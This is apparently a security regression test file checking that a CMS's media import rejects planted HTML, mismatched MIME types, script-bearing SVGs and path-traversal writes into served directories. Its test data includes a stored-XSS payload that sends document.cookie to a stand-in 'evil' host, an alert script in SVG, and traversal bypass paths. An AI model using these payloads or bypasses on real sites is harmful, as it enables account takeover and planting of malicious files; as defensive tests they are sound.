/**
 * Security regression tests for the shared imported-media gate.
 *
 * Both import paths — the JSON `SiteBundle` import (`import.ts`) and the
 * archive import (`importArchive.ts`) — route media through these two
 * functions. The JSON path previously wrote `bytesBase64` to
 * `join(uploadsDir, storagePath)` with only a traversal check, letting a
 * `data.import` caller plant arbitrary HTML/JS (e.g. `published/current/
 * index.html`) served same-origin as `/admin` → stored XSS / account takeover.
 * These tests prove the content gate and the destination gate close it.
 */
import { describe, expect, it } from 'bun:test'
import { join } from 'node:path'
import {
  ImportMediaValidationError,
  resolveMediaWriteTarget,
  validateAndSanitizeMediaBytes,
} from '../importMediaValidation'
import { detectAcceptedMime, EXTENSION_FOR_MIME, IMAGE_MIMES } from '../mediaUpload'

const enc = new TextEncoder()

// PNG 8-byte magic signature — enough for `detectAcceptedMime` to classify.
const PNG_MAGIC = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x01])
const AVIF_MAGIC = new Uint8Array([
  0x00, 0x00, 0x00, 0x1c,
  0x66, 0x74, 0x79, 0x70,
  0x61, 0x76, 0x69, 0x66,
])

describe('validateAndSanitizeMediaBytes — content gate', () => {
  it('accepts AVIF as an image upload instead of misclassifying it as MP4', () => {
    expect(detectAcceptedMime(AVIF_MAGIC)).toBe('image/avif')
    expect(Object.entries(EXTENSION_FOR_MIME)).toContainEqual(['image/avif', '.avif'])
    expect(IMAGE_MIMES).toContain('image/avif')
  })

  it('rejects HTML/script bytes (no accepted media MIME) — the account-takeover payload', () => {
    const html = enc.encode('<!DOCTYPE html><script>fetch("//evil/?c="+document.cookie)</script>')
    expect(() =>
      validateAndSanitizeMediaBytes(html, { storagePath: 'published/current/index.html', mimeType: 'text/html' }),
    ).toThrow(ImportMediaValidationError)
  })

  it('rejects a MIME mismatch (SVG bytes declared image/jpeg)', () => {
    const svg = enc.encode('<svg><rect width="10" height="10"/></svg>')
    expect(() =>
      validateAndSanitizeMediaBytes(svg, { storagePath: 'photo.jpg', mimeType: 'image/jpeg' }),
    ).toThrow(ImportMediaValidationError)
  })

  it('rejects extension laundering (SVG bytes named .html)', () => {
    const svg = enc.encode('<svg><rect width="10" height="10"/></svg>')
    expect(() =>
      validateAndSanitizeMediaBytes(svg, { storagePath: 'exploit.html', mimeType: 'image/svg+xml' }),
    ).toThrow(ImportMediaValidationError)
  })

  // SVG sanitisation goes through DOMPurify's SVG profile, which is only
  // reliable on the jsdom runtime the server installs (happy-dom, the bun-test
  // default DOM, mishandles the SVG walk), so run it in a clean process.
  it('sanitizes a <script> payload out of an otherwise-valid SVG (jsdom runtime)', () => {
    const result = Bun.spawnSync({
      cmd: [
        process.execPath,
        '-e',
        `
          await import('./server/richtextSanitizer.ts')
          const { validateAndSanitizeMediaBytes } = await import('./server/handlers/cms/importMediaValidation.ts')
          const svg = new TextEncoder().encode('<svg viewBox="0 0 10 10"><script>alert(1)</script><rect width="10" height="10"/></svg>')
          const clean = new TextDecoder().decode(
            validateAndSanitizeMediaBytes(svg, { storagePath: 'icon.svg', mimeType: 'image/svg+xml' }),
          ).toLowerCase()
          if (clean.includes('<script')) throw new Error('script survived: ' + clean)
          if (!clean.includes('<rect')) throw new Error('geometry lost: ' + clean)
        `,
      ],
      stdout: 'pipe',
      stderr: 'pipe',
    })
    if (result.exitCode !== 0) {
      throw new Error(new TextDecoder().decode(result.stderr))
    }
  })

  it('passes a valid image through unchanged', () => {
    const out = validateAndSanitizeMediaBytes(PNG_MAGIC, { storagePath: 'abc.png', mimeType: 'image/png' })
    expect(out).toEqual(PNG_MAGIC)
  })
})

describe('resolveMediaWriteTarget — destination gate', () => {
  const uploads = '/tmp/uploads'

  it.each(['published/current/index.html', 'plugins/acme/app.js', 'fonts/inter.woff2', 'PUBLISHED/x.png'])(
    'rejects a write into the reserved served subtree: %s',
    (storagePath) => {
      expect(() => resolveMediaWriteTarget(uploads, storagePath)).toThrow(ImportMediaValidationError)
    },
  )

  // GHSA-5h25: the denylist ran on the raw storagePath, but `join` normalises a
  // leading `./` (and any `..` bounce) back into the reserved subtree, so these
  // slipped past a check on the raw string. The check now runs on the
  // normalised landing path.
  it.each([
    './published/current/pwn.svg',
    './plugins/acme/app.js',
    './fonts/inter.woff2',
    'x/../published/current/pwn.svg',
  ])('rejects a leading-./ or traversal bypass into a reserved subtree: %s', (storagePath) => {
    expect(() => resolveMediaWriteTarget(uploads, storagePath)).toThrow(ImportMediaValidationError)
  })

  it('rejects a traversal escape', () => {
    expect(() => resolveMediaWriteTarget(uploads, '../evil.png')).toThrow()
  })

  it('resolves a normal hashed media filename to a path inside uploads', () => {
    expect(resolveMediaWriteTarget(uploads, 'a1b2c3-photo.jpg')).toBe(join(uploads, 'a1b2c3-photo.jpg'))
  })
})
